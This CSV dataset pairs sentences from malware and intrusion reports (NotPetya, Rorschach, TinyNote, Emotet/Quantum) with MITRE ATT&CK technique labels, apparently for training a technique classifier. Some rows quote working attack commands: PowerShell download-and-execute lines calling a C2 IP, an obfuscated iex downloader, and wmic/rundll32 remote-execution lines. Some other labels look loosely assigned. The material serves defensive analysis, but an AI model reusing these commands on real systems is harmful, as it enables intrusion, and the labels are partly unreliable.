text,label
"It spreads to Microsoft Windows machines using several propagation methods, including the EternalBlue exploit for the CVE-2017-0144 vulnerability in the SMB service.",T1210
"Once a machine is infected by NotPetya, a series of malicious activities ensue, including the following: Dropped files Process hashes and process privilege checks Credential theft Token impersonation Malware propagation Network node enumeration SMB copy and remote execution SMBv1 exploitation via EternalBlue UNC write malware to admin$ on remote target Remote execution of the malware MBR ransomware Physical drive manipulation MFT encryption File encryption System shutdown Anti-forensics Ransomware instructions for file recovery occur after the infection process has completed.",T1570
Ransomware DLL C:\windows\perfc.dat,T1140
"The malware decompresses its resource named 0x3 of type RT_RCDATA, and writes the contents to C:\Windows\dllhost.dat.",T1140
C:\windows\dllhost.dat Credential theft module Written as a .tmp file to the temp directory Ransomware splash and warning files Command Line Execution,"T1059.003, T1218.011"
"The malware is a DLL that is launched using rundll32.exe: “C:\Windows\perfc.dat”,#1 18",T1218.011
It is executed with the following arguments: #1 → This is the ordinal number of the exported function 18 → Minutes used to determine how long to wait for the scheduled shutdown “username:pass” → Credentials to be used to propagate the malware on the network.,T1057
"Process Hashes and Process Privilege Checks Upon being loaded, the malware starts a subroutine that hashes each running process on the system, and compares each hash with 3 hardcoded hashes: 0x6403527E → avp.exe associated with Kaspersky AV 0x23214B44 → ns.exe associated with Norton Security 0x651B3005 → ccSvcHst.exe associated with Symantec A global flag PROC_FLAG is used to track which of the 3 processes are running on the system. PROC_FLAG","T1057, T1518.001"
The credential theft module is dropped if the malware has one of the following privileges: (It should be noted that the PROC_FLAG can any of the possible values) SeDebugPrivilege SeShutdownPrivilege & SeDebugPrivilege SeDebugPrivilege & SeTcbPrivilege SeShutdownPrivilege & SeDebugPrivilege & SeTcbPrivilege The MBR overwrite and MFT encryption subroutine is not executed if avp.exe is found running on the system The EternalBlue subroutine is not executed if either ns.exe or ccSvcHst.exe are found running on the system The system is rebooted using the API NtRaiseHardError if the process has at least the SeShutdownPrivilege level Credential Theft Credentials are provided to the malware in two ways:,T1106
"The malware decompresses a resource (0x1 if the OS is x86, 0x2 if the OS is x64) of type RT_RCDATA using zlib 1.2.8 compression.",T1140
"It calls OpenProcess on lsass.exe with access flag set to VM_READ, and looks for the modules wdigest.dll and lsasrv.dll loaded in the lsass.exe process.",T1003.001
"Server service, which both enforces security policies and acts as the security package manager for the LSA This file extracts credentials from LSASS similar to Mimikatz.",T1003.001
The impersonated token replaces the current thread token with SetThreadToken and the thread is resumed.,T1570
This thread is then used to execute the SMB copy and remote execution section as the impersonated user.,T1570
Malware Propagation The following methods are used to spread across a network: Network node enumeration SMB copy and remote execution SMB exploitation via EternalBlue Network Node Enumeration,"T1570, T1210"
"The malware creates a thread for core work that invokes the following API’s: GetExtendedTcpTable to retrieve a list of TCP endpoints GetIpNetTable to retrieve the IPv4 to physical address mapping table → Gets a MIB_IPNETTABLE structure NetServerEnum to get a list of servers on the domain with the following parameters: Servername = null level = 101 (return server names, types, and associated data) NetServerGetInfoto retrieve the current configuration for the local server, specifically to determine if the system is a non-domain controller server, a primary domain controller, or a backup domain controller.","T1106, T1082"
"For each client, the following occurs: Obtains the IP address from the ClientIpAddress field in the DHCP_CLIENT_INFO structure Attempts to establish a socket connection to the client IPs over ports 445 and 139 (both associated with SMB) SMB Copy and Remote Execution There are two approaches to using valid credentials to copy and execute the malware to a remote host: Token impersonation Requires the process to have “SeTchPrivilege” Stolen credentials Each of these methods will be used to do a UNC write to Admin$ and then execute the malware on the target machine.","T1570, T1210, T1016, T1078"
SMBv1 Exploitation via EternalBlue NotPetya has the capability to exploit SMBv1 via the well known EternalBlue exploit.,T1210
"UNC Write to Admin$ WNetAddConnection2W is used to connect to a server using the default credentials for the impersonated token, and an attempt is made to write the file to: \\server-name\\admin$\\malware-name UNC write to admin$ CreateFile and WriteFile are used to write the file to the remote server.","T1106, T1078"
→ run as system -d → do not wait for process termination -u → username (not shown here) -p → password (not shown here) WMIC,T1047
The following command will execute on the remote as the specified user: C:\Windows\system32\wbem\wmic.exe /node:”<server name>” /user:”<username>”,T1047
"/password:”<password>” process call create “C:\Windows\System32\rundll32.exe \”C:\Windows\perfc.dat\” #1 19 “<additional creds for arguments>”” /node → specify server name /user → username /password → password Process call create → execute remote command Once the command line arguments are generated, either CreateProcessAsUser or CreateProcess is executed, depending on whether this is being done through impersonation or stolen credentials.","T1106, T1059.003"
The malware takes the following steps to modify the MBR: Reads the MBR and encodes it using XOR encoding with key 0x7 The first sector is overwritten by a custom boot loader,T1027
"In addition, another random array of bytes 0x8 in length is created using the same API call; this is used as the nonce for the encryption.",T1106
This is used as an integrity check for the decryption process.,T1140
"Sector 34 contains the original MBR that was encoded by XORing with 0x7 MFT Encryption As mentioned previously, the malware has its own custom boot loader once the machine has been infected and rebooted.",T1027
"However, its main purpose is to encrypt or decrypt the MFT, which it is able to accomplish using Salsa20.",T1140
"The following are the BIOS interrupt services used throughout the code: int 0x13 – read/write sectors on disk int 0x10 – display text int 0x19 – cause disk reboot int 0x16 – obtain keystrokes, and status of keyboard buffer The code first checks the CRYPT_FLAG in sector 32 to see whether it has been set to 1 (encrypted).",T1056.001
"Once the key is entered, the code attempts to decrypt the contents of Sector 33, which were previously encrypted using Salsa20 key.","T1027, T1140"
"Once the sector is decrypted, the code reads all 512 bytes of the sector and ensures that they all equal 0x7.",T1140
"If this is successful, the CRYPT_FLAG is set to 2 (decrypted), and the same key is used to decrypt the MFT.",T1140
"Furthermore, the original encoded MBR in Sector 34 is also decoded, and placed back into Sector 0, as shown below.","T1027, T1140"
.vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip,T1083
The malware only targets fixed drives on the system.,T1083
The malware will first start enumerating files in the directory it is being executed from.,T1083
"The following steps are taken to encrypt the individual files: Gets file handle Gets the file size Creates a file mapping of the file with PAGE_READWRITE protection Maps the view of the file mapping with FILE_MAP_WRITE | FILE_MAP_READ access Calls CryptEncrypt to encrypt the contents of the file using AES-128 Once the files in a folder are encrypted, the ransomware drops a ransomware note in a file named README.txt.",T1106
The <HH:MM> value depends on the second parameter when being invoked by rundll32.exe.,T1218.011
"If the second parameter is 30, the scheduled task will trigger 30 minutes after the malware execution.",T1053.005
"However, if no second parameter is provided, the scheduled task is set to trigger 60 minutes after the malware execution by default.",T1053.005
Explanation of schtask parameters: /TN → taskname (not providing a custom name forces Windows to provide a random GUID as a name) /TR → taskrun.,T1053.005
Path and filename of the task to be run /ST → starttime Explanation of shutdown.exe parameters:,T1053.005
"/r → reboot after shutdown /f → forces running applications to close In addition, it also invokes the API NTRaiseHardError.",T1106
This is an undocumented Windows API that causes the system to reboot.,T1106
"If the API fails to execute, the malware calls InitiateSystemShutdownExW with the flag set to reboot the machine.",T1106
"For instance, immediately after execution, it loads itself in memory, and deletes itself from the disk.",T1027
"Once the contents of its resource section are decompressed and written to disk, it zeros out the memory buffer containing the decompressed PE files.",T1140
The malware also spawns cmd.exe to execute the following command:,T1059.003
They adopt multiple approaches to obfuscate their tools and eliminate their footprint after finishing the operation.,T1027
"The latest variant demonstrates that threat actors have adopted more obfuscation techniques, including abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing.","T1027, T1106"
"In early 2022, we further discovered that Earth Zhulong abused group policy objects (GPO) to install loaders and launch Cobalt Strike on their target hosts.",T1484.001
"Several hack tools were also found on the infected hosts, including tunneling, port scanning, a Go-lang based backdoor and an information stealer used to harvest internal information.",T1005
"Once the victim opens the document, the embedded macro will be executed, injecting the shellcode into rundll32.exe.","T1055, T1204.002"
Shellcode which is used for code injection.,"T1055, T1484.001"
"Propagation through GPO In early 2022, we further observed new TTPs used to spread malware in the victim’s environment.",T1484.001
"Once they successfully compromise the domain controller, they will submit immediate tasks to the hosts in the domain through GPO as seen in Figure 5, As the hosts receive the task through GPO, they will run a PowerShell script named “co.ps1” and create scheduled tasks for persistence. Figure 4.","T1484.001, T1053.005"
PowerShell script to create a ImmediateTask through GPO,T1053.005
"As shown in Figure 6, threat actors use multi-layered AES encryption and base64 encoding to obfuscate “co.ps1”.",T1027
Heavy obfuscation in a simple but useful anti-analysis approach makes it difficult for security products to detect their scripts.,T1027
Heavily obfuscated PowerShell script Figure 7.,T1027
Cleaned content of co.ps1 Earth Zhulong adopted DLL sideloading techniques to run their malware.,T1574.002
"The malicious DLL “gtn.dll”, which we named as “ShellFang”, loads when a legitimate executable is launched.",T1574.002
"It then calls the export function, “Go”, to start the loading procedure of the encrypted payload to decrypt the payload called “lengs.medil.xml”, which is the Cobalt Strike beacon. Figure 8. win.exe file information Figure 9. win.exe will call the malicious export function in gtn.dll Evolution of ShellFang loader During the investigation, we found that Earth Zhulong started targeting Southeast Asian firms in 2020.","T1027, T1140"
"Although they always used DLL sideloading to launch their malware, they never stopped changing the code structure of their shellcode loader.",T1574.002
It would read the encrypted payload (“nkford.nlp” is the payload in this case) then decrypt it and run it in the memory.,"T1027, T1140"
"They changed the decryption function into RC4 instead of the original XOR, but the code structure was basically the same as the previous variant.",T1140
"In this variant, more anti-analysis techniques were added to strengthen their loader, including API hashing and execution flow obfuscation through exception mechanism.",T1027
Threat actors intentionally raise exceptions to interrupt malware analysts and obfuscate the execution flow of the program.,T1027
Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time.,"T1027, T1106"
"The payload will be decrypted with RC4 algorithm, and the final payload is an HTTPs Cobalt Strike beacon.","T1140, T1071.001"
A loop of intentional exception triggers to obfuscate control flow of program.,T1027
Necessary APIs will be dynamically resolved during execution.,T1027
"Hacking Tools Besides the shellcode loader and Cobalt Strike, we also observed additional tools, including port scanner, proxy and information stealer deployed to the compromised hosts.",T1090
"It supports proxy (Socks5), upload/download file and remote shell functions.","T1090, T1105, T1059.003"
"Furthermore, the configuration file will be deleted once it is loaded into memory for fear of leaking network infrastructures.",T1070.004
-to=0 -cg=1 Information defined in the configuration file.,T1027
"Themida-packed EarthWorm During our investigation, we found they also use the notorious network-penetration tool, “EarthWorm”.",T1027
EarthWorm is a simple network tunnel tool with SOCKS v5 server and port transfer developed by a Chinese engineer.,T1090
"In order to avoid being detected by security products, threat actors use Themida packer to obfuscate the signature used for detection.",T1027
"This information stealer is compiled with Python 3.10 and packed by noted tools, “PyInstaller”, used to convert python script to be a standalone executable.",T1027
"After checking the Python assembly code of the sample, we found this tool is used to dump information from the victim’s Oracle database.",T1005
"After finishing the operation, they will clean the intrusion footprint and delete important files, including payload and network configuration files, to avoid leaking any information to analysts.",T1070.004
Obfuscated PowerShell script used to clean the footprint on Domain Controller Figure 18.,T1027
"In addition, we reviewed reports published around that time and found the decryption algorithm in ShellFang was once used in the campaign by 1937CN, which was revealed by Fortinet in 2017.",T1140
"In the past 2 years, they always have used DLL sideloading as their major technique to launch their malware.",T1574.002
"However, they continued updating their tools and even added more anti-analysis techniques in their latest tools including multi-layer obfuscation, API obfuscation, and execution flow obfuscation by raising exceptions intentionally.",T1027
We also found they compromise the domain controller in the victim’s environment and deployed Cobalt Strike on their hosts by creating immediate tasks through GPO.,T1484.001
"Furthermore, Python and Go-lang executables usually compile all necessary libraries in a single binary, making malware classification more difficult for analysts and resulting in a large binary.",T1027
"Based on the victimology and usage of a highly similar decryption algorithm, we believe that Earth Zhulong is related to the hacking group known as “1937CN”.",T1140
"Interestingly, the folder with the backdoor contained two other tools: Autoruns by Sysinternals, and HRSWord, which is a part of the Chinese Huorong Network Technology protection suite, and is often used by various actors to disable endpoint protection tools.",T1562.001
"The TinyNote backdoor is a basic remote shell, limited in capabilities: it enables the actors to fingerprint the infected machine, set up persistence, and establish two different ways to execute commands received from the C&C server.",T1059.003
"SmadAV evasion At the beginning of its execution, the malware starts a function called bypassSMADAV, whose purpose is to bypass the Indonesian antivirus Smadav.",T1106
"It’s worth mentioning that in previous operations, the actors used SmadAV for their own purposes, forcing its component SmadAVprotect32.exe to side-load their malicious DLL.",T1574.002
"For every problematic window found, the antivirus checks if the window is visible with the API function IsWindowVisible.",T1106
This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.,T1055
"These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB:",T1106
Figure 2 – A piece of malware code creates a specially crafted window to bypass the smadAV.,T1106
"Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.",T1106
"But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.",T1106
"Next, the malware creates 2 scheduled tasks called test and test2 to retrieve and execute PowerShell commands, each retrieved from robots.txt from different C&C servers, most likely to eliminate a single point of failure: schtasks /Create",T1053.005
"/TN test /SC MINUTE /MO 15 /TR ""powershell \""$r=[System.",T1053.005
"Net.WebRequest]::Create(\\\""http://103.159.132.91/Robots.txt\\\"");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\"""" /f At the time of execution, both servers returned the same code pointing to the third server: C:\Windows\System32\cmd.exe /c ""start powershell.exe -nop",T1059.003
"-c set-alias exi iex;`$v1='iex (new-object net.webclient).dow';`$v2='nloadstring(''http://';`$v3='103.159.132.91/robots1.txt'')';exi(`$v1+`$v2+`$v3);"" The final payload returned is a lightweight PowerShell backdoor, which retrieves a list of commands from the CMD header from the C&C server response, executes them with Invoke-Expression, concatenates the outputs with '_n1w_' string, and sends them back to the server in POST request: $WindowState = '[DllImport(""user32.dll"")]","T1105, T1071.001"
"Finally, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create",T1053.005
"/TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe"" /f Second mode: the backdoor This mode happens after the malware has achieved persistence and is running from a “zip” path.",T1053.005
"First, the malware enumerates the system for the following data and concatenates it to one string:",T1033
"The current system username The current username home folder The system’s network interfaces (name, MacAddress, description)","T1033, T1082"
It then picks one random C&C URL out of the three available and constructs a GET request: http://5.188.33.190/api.php http://103.169.90.132/api.php http://103.159.132.91/api.php,T1071.001
"Safari/537.36 The expected result from the server is a JSON with the following structure: {""msg"":""[BASE64-ENCODED COMMAND]""} After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the command and continues to listen for more commands in a loop.",T1140
"The ransomware was deployed using DLL side-loading of a Cortex XDR Dump Service Tool, a signed commercial security product, a loading method which is not commonly used to load ransomware.",T1574.002
"Execution Flow As observed in the wild, Rorschach execution uses these three files: cy.exe – Cortex XDR Dump Service Tool version 7.3.0.16740, abused to side-load winutils.dll winutils.dll – Packed Rorschach loader and injector, used to decrypt and inject the ransomware.","T1574.002, T1027"
"Upon execution of cy.exe, due to DLL side-loading, the loader/injector winutils.dll is loaded into memory and runs in the context of cy.exe.",T1574.002
"The main Rorschach payload config.ini is subsequently loaded into memory as well, decrypted and injected into notepad.exe, where the ransomware logic begins.","T1055, T1140"
"Delete shadow volumes and backups to harden recovery, using legitimate Windows tools such as vssadmin.exe, bcdedit.exe, wmic.exe, and wbadmin.exe Run wevutil.exe to clear the following Windows event logs: Application, Security, System and Windows Powershell.",T1562.001
"Disable the Windows firewall, using netsh.exe Self-propagation When executed on a Windows Domain Controller (DC), the ransomware automatically creates a Group Policy, spreading itself to other machines within the domain.","T1562.001, T1484.001"
"Similar functionality was linked in the past to LockBit 2.0, although the Rorschach Ransomware GPO deployment is carried out differently, as described below: Rorschach copies its files into the scripts folder of the DC, and deletes them from the original location.",T1070.004
Rorschach then creates a group policy (see Appendix C) that copies itself into the %Public% folder of all workstations in the domain.,T1484.001
The ransomware creates another group policy in an attempt to kill a list of predefined list of processes.,T1484.001
This is done by creating a schedule task invoking taskkill.exe.,T1053.005
"Finally, Rorschach creates another group policy that registers a scheduled task which runs immediately and upon user logon, to run Rorschach’s main executable with the relevant arguments.","T1484.001, T1053.005"
"First, the initial loader/injector winutils.dll is protected with UPX-style packing.",T1027
"After unpacking, the sample loads and decrypts config.ini, which contains the ransomware logic.","T1027, T1140"
"After Rorschach is injected into notepad.exe, it’s still protected by VMProtect.",T1055
It makes direct system calls using the “syscall” instruction.,T1106
"The ransomware finds the relevant syscall numbers for NT APIs, mainly related to file manipulation.",T1106
"When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API.",T1106
"In other words, the malware first creates a syscall table for NT APIs used for file encryption: Figure 3 – Creation of syscall table for certain NT APIs.",T1106
The example below shows how the syscall numbers are used: Figure 5 – Example use of direct syscall.,"T1027, T1106"
"This obfuscated process is not required for the ransomware encryption logic, which suggests it was developed to bypass security solutions monitoring direct API calls.","T1027, T1059.003"
Command Line Arguments,T1059.003
"--nobk=0 Language Based Protection Before encrypting the target system, the sample runs two system checks that can halt its execution: It uses GetSystemDefaultUILanguage and GetUserDefaultUILanguage to determine what language the user is using.",T1106
The WinAPI CryptGenRandom is utilized to generate cryptographically random bytes used as a per-victim private key.,T1106
"However, the list of processes to be stopped differs slightly, as Rorschach omits notepad.exe, which is used as a target for code injection.",T1057
"The final renaming of the encrypted machine files in Rorschach is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation, just like in LockBit v2.0.",T1106
"As noted before, Rorschach’s code is protected and obfuscated in a way that is unusual for ransomware, and is compiled with compiler optimization to favor speed and code inlining as much as possible.",T1027
"While Data Execution Prevention (DEP) has been engineered to block plain code injection attacks from specific memory areas, attackers have quickly adapted and instead of injecting an entire code payload, they resorted in reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets.",T1055
"Given that ROP-based attacks execute “RET” instructions without a prior “CALL” instruction, the running thread’s stack and the shadow stack values mismatch and so backward-edge CFI like CET effectively blocks this attack technique.",T1055
"Once the Looper is running, it can then call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors.",T1055
"Once the registers are populated by one or more Argument Loaders, an Invoker vfgadget can be called to simply execute the function pointer of the target API.",T1055
"Collectors are gadgets that retrieve a value already present in a register, and save it back into the attacker’s counterfeit object (i.e. as a returned value from an invoked API).",T1055
"As part of the automated part of the exploit, in order to obtain the vfgadget’s this pointer, we have leaked the stack pointer and retrieved the this pointer as a static offset from the stack.",T1055
"Once we have obtained the this pointer address, we prepare the address of the Windows API we want to invoke along with its arguments.",T1106
"5086014001000000 f0040becfb7f0000 ""edgehtml.dll"" Getting the PoC’s syntax The application accepts four parameters: a pointer to our counterfeit object (COOP) buffer, the vfgadget address, the Windows API address and its arguments.","T1106, T1055"
"public: virtual void trigger(char* a1) { callback(a); } }; The ‘trigger’ method from which we derive the vfgadget The class OffSec present in the project contains a trigger method which acts as a C-style function pointer that we can abuse to invoke any API we like, as we’ll see shortly.",T1106
"Remote access tools were used for command and control, such as Tactical RMM and Anydesk.",T1219
"Case Summary The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands to download an Emotet DLL onto the computer.","T1105, T1204.002"
"Once executed, Emotet setup a Registry Run Key to maintain persistence on the beachhead host.",T1547.001
"Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers.","T1016, T1082"
"Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading.",T1566.001
"Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.","T1057, T1059.003"
"Next, they proceeded to transfer a beacon executable over SMB to the remote host’s ProgramData directory.",T1570
This beacon was then successfully executed via WMI and connected successfully to the threat actors server.,T1047
Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.,T1059.003
They then proceeded to dump credentials from the LSASS process on the host.,T1003.001
With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.,T1055
A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.,"T1570, T1078"
"The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL’s.",T1570
"On the domain controller, the threat actors conducted further discovery tasks running find.bat and p.bat, which executed AdFind active directory discovery and performed a ping sweep across the environment.",T1059.003
"On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.",T1219
On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.,T1219
"After establishing a connection using Anydesk, the threat actors then dropped SoftPerfect’s Network Scanner and ran it to identify hosts across the environment.","T1105, T1021.001"
"From there, the threat actors began connecting to other hosts via RDP, including the a backup server.",T1021.001
"After choosing a new server and connecting via RDP, the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions.","T1105, T1021.001"
"Finally, locker.dll and a batch file 1.bat were dropped on the host and the batch file was executed beginning the Quantum rasomware deployment to all hosts over SMB.","T1570, T1059.003"
"After ransomware deployment, the threat actors remained connected and did RDP to a few other servers and executed ProcessHacker.exe and a net command.",T1021.001
The Powershell script embedded within the LNK is a Base64 encoded script with various components split into different variables for obfuscation purposes.,T1027
The script will decode itself rather than depend on Powershell’s built-in ability to execute encoded scripts. ..,"T1027, T1140"
"Convert]::FromBase64String($GBUus));$GBUus=$xCyRLo;iex($GBUus)}"" The Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware.",T1204.002
Almost all the instances of Emotet included three enumeration commands executed: systeminfo ipconfig /all,"T1016, T1082"
"On the first day, Emotet established persistence via a run key.",T1547.001
"After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment.",T1219
Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.,T1219
"""C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth 5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508c",T1543.003
A service was also created for the agent.,T1543.003
Event 7045A service was installed in the system.,T1543.003
-m svcService Type: user mode serviceService Start Type: auto startService Account:,T1543.003
"LocalSystem Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was installed to handle remote session interaction, and a separate service was created for that agent.",T1543.003
"Service Name: Mesh AgentService File Name: ""C:\Program Files\Mesh Agent\MeshAgent.exe""Service Type: user mode serviceService Start Type: auto startService Account:",T1543.003
"LocalSystem On the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware.","T1543.003, T1219"
"Service Name: AnyDesk ServiceService File Name: ""C:\Program Files (x86)\AnyDesk\AnyDesk.exe"" --serviceService",T1543.003
Type: user mode serviceService Start Type: auto startService Account:,T1543.003
"LocalSystem Privilege Escalation We suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it.",T1543.003
One indicator is the ‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon implementation.,T1003.001
"Defense Evasion Process Injection The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system.","T1055, T1070.004"
"The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread.",T1055
"This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike.",T1218.011
"The following table summarizes the processes used for injection during this case: Injected Process Name Injection Payload C:\Windows\system32\winlogon.exe Cobalt Strike C:\Windows\System32\RuntimeBroker.exe Cobalt Strike C:\Windows\System32\svchost.exe Cobalt Strike C:\Windows\System32\taskhostw.exe Cobalt Strike C:\Windows\system32\dllhost.exe Cobalt Strike PowerTool PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload.","T1105, T1055"
"This tool has the ability to kill a process, delete its process file, unload drivers, and delete the driver files.",T1070.004
北京华林保软件技术有限公司 Indicator Removal The threat actor was observed deleting files that had been dropped to disk.,T1027
"Credential Access Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike.","T1003.001, T1055"
"The Granted Access level matches know indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in a prior report.",T1003.001
"We also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor.",T1003.001
"These were then repeated, seen occurring once a day from the Emotet host. systeminfo ipconfig /all","T1016, T1082"
"nltest /dclist: Multiple commands responsible for enumerating Active Directory groups, domain joined computers, and domain trusts, were executed via Cobalt Strike on the beachhead.",T1033
"whoami /groups net group /domain net group ""domain computers"" /domain",T1033
ping COMPUTER.REDACTED.local Invoke-ShareFinder was observed being used via Powershell in the environment from an injected process with Cobalt Strike:,T1055
"Once on the domain controller, two batch files were run.",T1059.003
The first find.bat was used to run AdFind.exe for Active Directory discovery.,T1059.003
"IP_ADDRESS_1 C:\Windows\System32\mstsc mstsc.exe /v:IP_ADDRESS_2 C:\Windows\SysWOW64\explorer.exe ""C:\Windows\SysWOW64\explorer.exe"" \\IP_ADDRESS_1\C$ C:\Windows\SysWOW64\explorer.exe ""C:\Windows\SysWOW64\explorer.exe"" \\IP_ADDRESS_2\C$ Lateral Movement Cobalt Strike Remote Service Creation The threat actor was observed creating remote services in order to execute beacon DLL files transferred via SMB as SYSTEM on remote hosts.","T1569.002, T1218.011, T1570, T1059.003, T1543.003"
"C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA WMI","T1059.003, T1218.011"
"In another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI.","T1570, T1047"
"wmic /node:IP_Address process call create ""cmd.exe /c start C:\Progradata\sc_https_x64.exe"" Remote Desktop Lastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement on the final day of the intrusion and during the ransomware deployment.","T1047, T1059.003, T1021.001"
"Collection On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents.",T1005
Both HTTP and HTTPS were observed to be used.,T1071.001
-m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth REDACTED This command reveals the floppasoftware.com domain used by the threat actor for the remote management of Tactical RMM Agent.,T1219
Using this RMM agent they proceeded to install AnyDesk on the host.,T1219
"MeshAgent.exe -kvm1 - Initiating Process File Name, column 6, row 12 ""MeshAgent.exe"" -b64exec cmVxdWlyZSgnd2luLWNvbnNvbGUnKS5oaWRlKCk7cmVxdWlyZSgnd2luLWRpc3BhdGNoZXInKS5jb25uZWN0KCczNzQ3Jyk7 The decoded base 64 content reveals commands for console access and connect actions.",T1140
They started by connecting to a new server via RDP from the server they just used Tactical RMM to deploy Anydesk.,T1021.001
"Once establishing the RDP connection, they deployed Powertool64.exe, likely to prevent intervention by any security tools and launched the software Don’t Sleep.",T1021.001
"Finally, with Don’t Sleep running, the threat actor executed a batch script named “1.bat“.",T1059.003
Indicators Atomic Emotet Deployment Domains descontador[.]com[.]br www.elaboro[.]pl el-energiaki[.]gr drechslerstammtisch[.]de dhnconstrucciones[.]com[.]ar dilsrl[.]com Emotet C2 Servers 103.159.224.46 103.75.201.2 119.193.124.41 128.199.225.17 131.100.24.231 139.59.60.88 144.217.88.125 146.59.226.45 149.56.131.28 159.89.202.34 165.22.211.113 165.227.166.238 178.128.82.218 209.126.98.206 213.32.75.32 37.187.115.122 45.226.53.34 45.55.134.126 46.55.222.11 51.210.176.76 51.254.140.238 54.37.70.105 82.223.82.69 91.207.181.106 92.114.18.20 94.23.45.86 96.125.171.165 Cobalt Strike 139.60.161.167 (survefuz[.]com) 139.60.160.18 (juanjik[.]com) Tactical RMM Agent api.floppasoftware[.]com mesh.floppasoftware[.]com 212.73.150.62 Computed K-1 06.13.2022.lnk de7c4da78a6cbba096e32e5eecb00566 02b4f495e9995cc2251c19cd9984763f52122951 1bf9314ae67ab791932c43e6c64103b1b572a88035447dae781bffd21a1187ad 17jun.exe 0ea68856c4f56f4056502208e97e9033 b80c987c8849bf7905ea8f283b79d98753e3c15a 41e230134deca492704401ddf556ee2198ef6f32b868ec626d9aefbf268ab6b1 dontsleep.exe 50cc3a3bca96d7096c8118e838d9bc16 b286b58ed32b6df4ecdb5df86d7d7d177bb7bfaf f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee locker.dll d2df4601c8d43e655163c0b292bc4cc9 f6727d5d04f2728a3353fbd45d7b2cb19e98802c 6424b4983f83f477a5da846a1dc3e2565b7a7d88ae3f084f3d3884c43aec5df6 netscan.exe 27f7186499bc8d10e51d17d3d6697bc5 52332ce16ee0c393b8eea6e71863ad41e3caeafd 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566 rclone.exe 22bbe1747933531e9c240e0db86268e2 c2a8776e21403eb00b38bfccd36d1c03dffb009e 53ae3567a34097f29011d752f1d3afab8f92beb36a8d6a5df5c1d4b12edc Behavioral The threat actor delivered Emotet via a Emotet loader in the form of a LNK file responsible for dropping Emotet via Powershell (K-1 06.13.2022.lnk).,T1219
Tactical RMM Agent was installed by the threat actor on a server to ensure remote access (17jun.exe).,T1219
Network mapping was performed using SoftPerfect Network Scanner (netscan.exe) followed by Quantum ransomware execution and propagation in the network (locker.dll).,T1021.001
The threat actor kept the remote desktop session alive by running a program to keep the session active (dontsleep.exe) Detections Network The DFIR Report Cobalt Strike 139.60.160.18The DFIR Report Cobalt Strike 139.60.161.167 ET Threatview.io High Confidence Cobalt Strike C2 IP group 1 ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET INFO Observed External IP Lookup Domain (icanhazip .com,T1021.001
"Distribution Methods Infected email attachments, malicious online advertisements, social engineering, software ‘cracks.’",T1566.001
"The LummaC2 stealer begins its operations by obtaining relevant device data, such as OS version and architecture, hardware ID, CPU, RAM, screen resolution, system language, etc.",T1082
